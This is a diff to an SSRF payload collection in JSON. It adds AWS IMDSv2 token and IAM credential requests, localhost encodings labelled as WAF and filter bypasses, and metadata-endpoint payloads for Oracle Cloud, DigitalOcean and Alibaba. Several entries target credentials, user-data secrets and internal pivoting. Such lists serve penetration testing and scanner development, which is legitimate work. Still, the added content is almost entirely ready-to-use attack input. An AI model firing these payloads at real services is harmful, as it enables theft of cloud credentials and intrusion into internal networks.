@@ -12,7 +12,9 @@
         {"payload": "http://169.254.169.254.nip.io/latest/meta-data/", "description": "nip.io DNS-based IP bypass", "waf_bypass": true},
         {"payload": "http://0xa9fea9fe/latest/meta-data/", "description": "Hex-encoded 169.254.169.254", "waf_bypass": true},
         {"payload": "http://2852039166/latest/meta-data/", "description": "Decimal IP representation of 169.254.169.254", "waf_bypass": true},
-        {"payload": "http://169.254.169.254/latest/meta-data/hostname", "description": "Instance hostname via metadata", "waf_bypass": false}
+        {"payload": "http://169.254.169.254/latest/meta-data/hostname", "description": "Instance hostname via metadata", "waf_bypass": false},
+        {"payload": "PUT http://169.254.169.254/latest/api/token (X-aws-ec2-metadata-token-ttl-seconds: 21600)", "description": "IMDSv2 token request — PUT with TTL header to get session token (required when IMDSv1 is disabled)", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ (X-aws-ec2-metadata-token: TOKEN)", "description": "IMDSv2 metadata with token — use token from PUT request in header to access metadata", "waf_bypass": false}
       ]
     },
     "gcp": {
@@ -79,6 +81,43 @@
         {"payload": "http://10.96.0.1:443/api/v1/namespaces", "description": "Kubernetes API via default ClusterIP service address", "waf_bypass": false},
         {"payload": "https://kubernetes.default.svc/api/v1/pods", "description": "Kubernetes pod listing via internal DNS", "waf_bypass": false},
         {"payload": "http://169.254.169.254/computeMetadata/v1/", "description": "GKE metadata endpoint for Kubernetes on GCP", "waf_bypass": false}
+      ]
+    },
+    "localhost_bypass": {
+      "description": "Alternative localhost representations to bypass SSRF filters that block 127.0.0.1 and localhost",
+      "payloads": [
+        {"payload": "http://127.1/", "description": "Shortened IPv4 — most OS stacks expand 127.1 to 127.0.0.1", "waf_bypass": true},
+        {"payload": "http://0177.0.0.1/", "description": "Octal IP notation — 0177 = 127 in octal, bypasses decimal pattern matching", "waf_bypass": true},
+        {"payload": "http://0x7f.0.0.1/", "description": "Hex IP notation — 0x7f = 127 in hex, evades decimal IP filters", "waf_bypass": true},
+        {"payload": "http://2130706433/", "description": "Decimal IP as single integer — 127.0.0.1 as 32-bit unsigned int", "waf_bypass": true},
+        {"payload": "http://[::1]/", "description": "IPv6 localhost — bypasses IPv4-only blocking rules", "waf_bypass": true},
+        {"payload": "http://0/", "description": "Zero address — routes to localhost on most Linux systems", "waf_bypass": true},
+        {"payload": "http://localhost.localstack.cloud/", "description": "Third-party DNS resolving to 127.0.0.1 — bypasses hostname-based filters", "waf_bypass": true},
+        {"payload": "http://[::ffff:127.0.0.1]/", "description": "IPv6-mapped IPv4 localhost — dual-stack representation bypasses IPv4 filters", "waf_bypass": true}
+      ]
+    },
+    "oracle_cloud": {
+      "description": "SSRF payloads targeting Oracle Cloud Infrastructure (OCI) instance metadata",
+      "payloads": [
+        {"payload": "http://169.254.169.254/opc/v1/instance/", "description": "OCI instance metadata root — returns instance details (id, region, shape)", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/opc/v1/instance/metadata/", "description": "OCI custom metadata — may contain user-defined secrets and config", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/opc/v2/instance/ (Authorization: Bearer Oracle)", "description": "OCI IMDSv2 endpoint — requires Authorization header with Bearer Oracle token", "waf_bypass": false}
+      ]
+    },
+    "digitalocean": {
+      "description": "SSRF payloads targeting DigitalOcean Droplet metadata service",
+      "payloads": [
+        {"payload": "http://169.254.169.254/metadata/v1.json", "description": "DigitalOcean full metadata as JSON — returns all droplet info in single response", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/metadata/v1/user-data", "description": "DigitalOcean user-data — cloud-init scripts that may contain secrets", "waf_bypass": false},
+        {"payload": "http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address", "description": "DigitalOcean private IP — useful for internal network pivoting", "waf_bypass": false}
+      ]
+    },
+    "alibaba": {
+      "description": "SSRF payloads targeting Alibaba Cloud ECS instance metadata",
+      "payloads": [
+        {"payload": "http://100.100.100.200/latest/meta-data/", "description": "Alibaba Cloud metadata root — uses unique 100.100.100.200 IP instead of 169.254.169.254", "waf_bypass": false},
+        {"payload": "http://100.100.100.200/latest/meta-data/ram/security-credentials/", "description": "Alibaba Cloud RAM role credentials — equivalent to AWS IAM role credentials", "waf_bypass": false},
+        {"payload": "http://100.100.100.200/latest/user-data", "description": "Alibaba Cloud user-data — initialization scripts that may contain secrets", "waf_bypass": false}
       ]
     }
   }
